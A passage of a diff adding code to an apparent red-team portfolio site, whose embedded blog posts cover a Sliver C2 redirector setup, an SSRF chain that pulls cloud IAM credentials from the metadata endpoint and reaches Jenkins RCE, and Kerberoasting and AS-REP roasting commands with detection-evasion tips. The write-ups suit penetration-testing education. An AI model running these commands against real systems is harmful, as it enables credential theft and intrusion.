+    RewriteRule ^/(.*)$ https://teamserver.internal:443/$1 [P,L]
+
+    # Default: serve decoy site
+    DocumentRoot /var/www/html/decoy
+&lt;/VirtualHost&gt;</pre>
+
+        <h3>// Generating Implants</h3>
+        <pre># HTTPS implant pointing to redirector
+sliver > generate --http https://c2.example.com --skip-symbols --os windows --arch amd64
+
+# Start HTTPS listener on team server
+sliver > https --domain c2.example.com --lport 443</pre>
+
+        <h3>// Operational Security Tips</h3>
+        <ul>
+          <li>Use categorized aged domains that blend with normal traffic</li>
+          <li>Implement IP allowlisting on redirectors for target network ranges</li>
+          <li>Rotate redirectors regularly during long engagements</li>
+          <li>Use separate C2 channels for different operation phases</li>
+          <li>Monitor redirector logs for blue team probing</li>
+        </ul>
+      `
+    },
+    {
+      tag: 'Web Pentesting',
+      date: '// 2026.04.15',
+      title: 'Chaining SSRF to Internal Service Compromise',
+      body: `
+        <h3>// Overview</h3>
+        <p>During a web application assessment, I discovered a Server-Side Request Forgery (SSRF) vulnerability that initially seemed low-impact but could be chained to achieve full internal service compromise and cloud environment access.</p>
+
+        <h3>// Initial Discovery</h3>
+        <p>The application had a URL preview feature that fetched content from user-supplied URLs. Testing revealed it followed redirects and could access internal resources:</p>
+        <pre># Testing for SSRF
+curl "https://app.target.com/api/preview?url=http://169.254.169.254/"
+# Response: metadata service accessible!
+
+# Enumerating internal network
+curl "https://app.target.com/api/preview?url=http://10.0.0.1:8080/"</pre>
+
+        <h3>// Escalation: Cloud Metadata</h3>
+        <p>Access to the cloud metadata service exposed temporary IAM credentials:</p>
+        <pre># AWS metadata endpoint
+/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Retrieved role name, then fetched credentials
+/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
+
+# Response contained AccessKeyId, SecretAccessKey, Token</pre>
+
+        <h3>// Pivoting to Internal Services</h3>
+        <p>Port scanning through the SSRF revealed an internal Jenkins instance with no authentication:</p>
+        <pre># Internal Jenkins at 10.0.0.50:8080
+/api/preview?url=http://10.0.0.50:8080/script
+
+# Executed Groovy script via Jenkins Script Console
+# Achieved RCE on internal build server</pre>
+
+        <h3>// Impact & Remediation</h3>
+        <ul>
+          <li>Cloud credentials exposed — could have led to full cloud account compromise</li>
+          <li>Internal services accessible without authentication</li>
+          <li>RCE on build server — supply chain risk</li>
+        </ul>
+        <p><strong>Recommendations:</strong> Implement URL allowlisting, block access to metadata endpoints (or use IMDSv2), enforce authentication on all internal services, and use network segmentation.</p>
+      `
+    },
+    {
+      tag: 'Kerberos',
+      date: '// 2026.03.02',
+      title: 'Kerberoasting vs. AS-REP Roasting: When to Use Which',
+      body: `
+        <h3>// Overview</h3>
+        <p>Both Kerberoasting and AS-REP Roasting are offline credential access techniques targeting Active Directory, but they exploit different misconfigurations and have distinct detection profiles. Understanding when to use each is essential for efficient red team operations.</p>
+
+        <h3>// Kerberoasting</h3>
+        <p><strong>Target:</strong> Service accounts with registered SPNs</p>
+        <p><strong>Requirement:</strong> Any valid domain user credential</p>
+        <p><strong>How it works:</strong> Request a TGS ticket for a service with an SPN. The ticket is encrypted with the service account's NTLM hash, which can be cracked offline.</p>
+        <pre># Enumerate accounts with SPNs
+Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+# Request and crack
+Rubeus.exe kerberoast /outfile:kerberoast.txt
+hashcat -m 13100 kerberoast.txt wordlist.txt</pre>
+        <p><strong>Detection:</strong> Event ID 4769 with RC4 encryption (0x17). High volume of TGS requests from a single source.</p>
+
+        <h3>// AS-REP Roasting</h3>
+        <p><strong>Target:</strong> Accounts with "Do not require Kerberos pre-authentication" enabled</p>
+        <p><strong>Requirement:</strong> Can be performed without domain credentials (just need valid usernames)</p>
+        <p><strong>How it works:</strong> Send AS-REQ without pre-authentication. The KDC returns an AS-REP containing data encrypted with the user's hash.</p>
+        <pre># Enumerate vulnerable accounts (authenticated)
+Get-DomainUser -PreauthNotRequired | select samaccountname
+
+# Unauthenticated enumeration + roasting
+impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+hashcat -m 18200 asrep.txt wordlist.txt</pre>
+        <p><strong>Detection:</strong> Event ID 4768 without pre-authentication, unusual AS-REQ patterns.</p>
+
+        <h3>// Decision Matrix</h3>
+        <ul>
+          <li><strong>No domain creds yet?</strong> &rarr; AS-REP Roasting (if you have a username list)</li>
+          <li><strong>Have domain user access?</strong> &rarr; Try both; Kerberoasting typically yields more targets</li>
+          <li><strong>Need to stay quiet?</strong> &rarr; Kerberoasting generates less suspicious traffic (TGS requests are normal)</li>
+          <li><strong>Targeting specific high-priv accounts?</strong> &rarr; Check if they have SPNs (Kerberoast) or pre-auth disabled (AS-REP)</li>
+        </ul>
+
+        <h3>// OPSEC Considerations</h3>
+        <ul>
+          <li>Use AES encryption in Kerberoasting requests to reduce detection (<code>/enctype:aes256</code>)</li>
+          <li>Limit the number of TGS requests per session</li>
+          <li>Target specific high-value SPNs rather than roasting everything</li>
+          <li>Both techniques are noisy if done in bulk — be selective</li>
+        </ul>
+      `
+    }
+  ];
+
+  function openBlogModal(id) {
+    const p = blogPosts[id];
+    document.getElementById('modalTag').textContent = p.tag;
+    document.getElementById('modalDate').textContent = p.date;
+    document.getElementById('modalTitle').textContent = p.title;
+    document.getElementById('modalBody').innerHTML = p.body;
+    document.getElementById('blogModal').classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeBlogModal() {
+    document.getElementById('blogModal').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  document.getElementById('blogModal').addEventListener('click', e => {
+    if (e.target === document.getElementById('blogModal')) closeBlogModal();
+  });
+
+  // ============ CONTACT FORM ============
+  document.getElementById('contactForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const status = document.getElementById('formStatus');
+    const name = document.getElementById('contactName').value.trim();
+    const email = document.getElementById('contactEmail').value.trim();
+    const subject = document.getElementById('contactSubject').value.trim();
+    const message = document.getElementById('contactMessage').value.trim();
+
+    if (!name || !email || !message) {
+      status.textContent = '// Error: Please fill in all required fields.';
+      status.className = 'form-status error';
+      return;
+    }
+
+    // Compose mailto link as fallback (works without backend)
+    const mailBody = encodeURIComponent(`Name: ${name}\nEmail: ${email}\n\n${message}`);
+    const mailSubject = encodeURIComponent(subject || 'Contact from Portfolio');
+    const mailto = `mailto:heavyghost0x00@proton.me?subject=${mailSubject}&body=${mailBody}`;
+
+    // Open mail client
+    window.location.href = mailto;
+
+    status.textContent = '// Message prepared. Your email client should open shortly.';
+    status.className = 'form-status success';
+
+    // Reset form
+    setTimeout(() => {
+      this.reset();
+      status.className = 'form-status';
+    }, 5000);
+  });
+
+  // ============ KEYBOARD SHORTCUTS ============
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') {
+      closeBlogModal();
+      closeTTPModal();
+    }
+  });
 </script>
 </body>
 </html>
